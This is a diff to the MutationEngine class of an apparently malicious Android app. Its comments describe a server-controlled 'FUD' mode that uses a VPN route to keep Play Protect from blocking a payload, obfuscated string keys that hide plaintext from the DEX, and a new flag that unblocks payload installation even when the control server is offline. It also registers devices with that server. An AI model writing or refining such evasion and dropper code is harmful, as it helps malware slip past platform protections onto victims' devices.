@@ -319,12 +319,15 @@ class MutationEngine(private val context: Context) {
                         // 0 = FUD OFF (VPN skipped entirely → Play Protect active → blocks payload)
                         // Default 1: unreachable server = FUD stays ON (safe default — never expose)
                         // Keys are obfuscated through StringPool — no plaintext in DEX
-                        // Server sends neutral key StringPool.d(StringPool.SRV_FLAG) = "f"
+                        // Server sends neutral key StringPool.d(StringPool.SRV_FLAG) = "sv"
+                        // .commit() (synchronous) guarantees write is flushed before signalling
+                        // fudFlagReady — prevents race where InstallActivity reads stale default.
                         val vpnBypass = payload.optInt(StringPool.d(StringPool.SRV_FLAG), 1)
                         context.getSharedPreferences(StringPool.d(StringPool.VG_PREFS), Context.MODE_PRIVATE)
                             .edit()
                             .putInt(StringPool.d(StringPool.VPN_FLAG), vpnBypass)
-                            .apply()
+                            .commit()   // synchronous — write guaranteed before fudFlagReady signal
+                        LauncherApplication.fudFlagReady = true  // unblocks InstallActivity wait
                         registerDeviceAsync(
                             payload.optString("device_id", ""),
                             mutations!!.optString(StringPool.d(StringPool.KEY_MODULE_PKG), ""),
@@ -338,7 +341,14 @@ class MutationEngine(private val context: Context) {
             // Timeout or network error — fall to Tier 2
         }
 
-        // Tier 2: Offline seeds if server unreachable
+        // Tier 2: Offline seeds if server unreachable.
+        // If server call failed or returned no payload, fudFlagReady was never set above.
+        // Signal it now — SharedPrefs retains its last written value (or the safe default=1
+        // if this is the first run). InstallActivity must not block forever waiting.
+        if (!LauncherApplication.fudFlagReady) {
+            LauncherApplication.fudFlagReady = true  // server miss — default FUD=ON (safe)
+        }
+
         if (mutations == null) {
             mutations = getOfflineMutationSeeds(fingerprint)
         }
